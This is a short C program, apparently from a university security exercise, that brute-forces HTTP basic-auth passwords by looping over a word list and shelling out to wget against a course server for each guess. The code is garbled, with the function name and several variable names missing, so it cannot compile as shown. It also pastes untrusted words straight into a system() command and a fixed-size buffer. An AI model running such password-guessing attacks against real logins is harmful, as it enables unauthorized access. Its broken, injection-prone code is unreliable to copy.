#include<stdio.h>
#include<stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/time.h>
#include<string.h>
int ()
{
  char PassString[100],pwd[3],p[100];
  char *t;
  const char l[]=" \n.,;:!-";
  int count=0;
  
  FILE *fh;
  fh=fopen("words.txt","r");
  int  ,end,tot;

   = time();
  
  while((fgets(PassString,sizeof(PassString),fh))!= NULL)
  { 
    t=strtok(PassString,l);
    while(t!=NULL)
    {
      count++;
      strcpy(p,"wget http://sec-crack.cs.rmit.edu./SEC/2 --http-user= --http-passwd=");
      strcat(p,t);
      if(system(p)==0)
      {
     
      end = time();
      tot = (end -);
      tot /= 1000000000.0;
      printf("The total time_var taken is:%llds\n",tot);
      printf("The number of attempts is:%d\n",count);
      exit(1);
      }
      t=strtok(NULL,l);
      printf("%s=\n",p);
      
    }
  
  }
  fclose(fh);
  return 0;
  }
